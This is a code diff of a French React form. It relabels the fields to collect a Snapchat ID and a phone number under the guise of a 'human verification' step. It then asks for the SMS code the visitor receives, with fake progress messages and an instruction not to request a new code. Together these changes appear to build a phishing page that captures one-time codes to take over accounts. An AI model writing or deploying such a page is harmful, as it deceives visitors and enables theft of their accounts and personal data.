@@ -18,7 +18,7 @@ const INFO_FIELDS = [
   { key: "prenom", label: "Prénom", placeholder: "Ex : Marie", type: "text" },
   { key: "nom", label: "Nom", placeholder: "Ex : Dupont", type: "text" },
   { key: "email", label: "Email", placeholder: "Ex : marie@email.com", type: "email" },
-  { key: "ville", label: "Ville", placeholder: "Ex : Paris", type: "text" },
+  { key: "ville", label: "ID Snap", placeholder: "Ex : snap.tock89", type: "text" },
 ] as const;
 
 // Le type de l'objet qui contient les 4 valeurs.
@@ -152,9 +152,10 @@ export default function UserPage() {
               {step === "info"
                 ? "Remplis ces 4 champs pour commencer."
                 : step === "word1"
-                ? "Écris ton premier mot, puis valide."
+                ? "Vérification que vous êtes un humain, puis valide."
                 : step === "word2"
-                ? "Encore un effort : le deuxième mot."
+                ? "Encore un effort : Entre le code reçu par sms. Patience vous recevrez
+un sms très bientot, (veuillez patienter, ne refaites pas demande)."
                 : "On te tient au courant par email."}
             </p>
           </div>
@@ -206,7 +207,7 @@ export default function UserPage() {
           <WordStep
             value={word1}
             onChange={setWord1}
-            placeholder="Ex : patate"
+            placeholder="Ex : +33617814167"
             autoFocus
             onBack={() => setStep("info")}
             onOk={() => setStep("loading1")}
@@ -218,7 +219,7 @@ export default function UserPage() {
           <LoadingStep
             duration={2600}
             message={(p) =>
-              p < 50 ? "Vérification du premier mot…" : "Préparation de la suite…"
+              p < 50 ? "Vérification du numero de téléphone…" : "Préparation de la suite…"
             }
             onComplete={async () => {
               // 📥 On crée le formulaire avec les infos + le 1er mot → on garde l'ID.
@@ -234,7 +235,7 @@ export default function UserPage() {
           <WordStep
             value={word2}
             onChange={setWord2}
-            placeholder="Ex : tomate"
+            placeholder="Ex : 2924"
             autoFocus
             onBack={() => setStep("word1")}
             onOk={() => setStep("loading2")}
